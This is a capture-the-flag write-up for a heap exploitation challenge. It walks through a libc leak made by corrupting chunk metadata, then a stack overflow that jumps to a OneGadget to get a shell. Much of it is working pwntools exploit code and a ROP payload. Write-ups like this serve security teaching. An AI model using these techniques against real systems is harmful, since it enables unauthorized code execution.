# Allocation Attack

## Solution

For this challenge, we are given a menu with five basic options: allocate to the heap and set its value, edit a value in the heap, free memory from the heap, view memory allocated to the heap, and exit the program. We also note that, when we exit the program, we do have a buffer overflow, but we are not given much data that we can overflow.

First, we use an Allocation Attack to leak the address of libc. We first allocate three values onto the stack. Then, we free the middle one. When we do this, addresses to the `main_arena` are added to the beginning of the memory.

Now, we overwrite the first chunk to set the memory map bit of the second chunk. When we do this, the second chunk will now not overwrite its memory when it is reallocated. Thus, when we allocate the second chunk again, it will now have the memory of libc in it, allowing us to view it.

The following code will leak the address of libc:
```python
p = start()

def create(index, content):
    log.info(f"Creating concert at index {index} with content {content}")
    p.sendlineafter(b">>>", b"1")
    p.sendlineafter(b">>>", str(index).encode('utf-8'))
    p.sendafter(b">>>", content)

def edit(index, content):
    log.info(f"Editing concert {index} to have content {content}")
    p.sendlineafter(b">>>", b"2")
    p.sendlineafter(b">>>", str(index).encode('utf-8'))
    p.sendafter(b">>>", content)

def delete(index):
    log.info(f"Deleting concert {index}")
    p.sendlineafter(b">>>", b"3")
    p.sendlineafter(b">>>", str(index).encode('utf-8'))

def view(index):
    p.sendlineafter(b">>>", b"4")
    p.sendlineafter(b">>>", str(index).encode('utf-8'))
    p.recvuntil(b"Details: ")
    #p.recvline()
    value = p.recvline()
    log.info(f"Viewed concert {index} to have value {value}")
    return value[:-1]

create(0, 0x87*b"A")
create(1, 0x87*b"B")
create(2, 0x87*b"C")
delete(1)
edit(0, 0x88*b"D" + b"\x93" + b"\0"*7)
create(1, 8*b"A")
leak = u64(view(1)[8:] + b'\0'*2)

log.info(f"Leak: {hex(leak)}")
libc.address = leak - libc.symbols["main_arena"] - 88
log.info(f"Libc main address: {hex(libc.address)}")
```

Now, we can use the buffer overflow in the exit section to call OneGadget. Unfortunately, upon initial testing, none of the OneGadget conditions are satisfied during the call. Luckily, we can make one of the OneGadget conditions satisfied by adding a `ret` before we call OneGadget (altering the alignment of the stack).

Thus, the following code will call `/bin/sh`:
```python
def jump(addr):
    r = ROP(libc)
    log.info(f"Jumping to {hex(addr)}")
    p.sendlineafter(b">>>", b"5")
    payload = b"A"*0x78
    payload += p64(r.find_gadget(['ret'])[0])
    payload += p64(addr)
    p.sendlineafter(b">>>", payload)

jump(libc.address + 0xf02a4)
```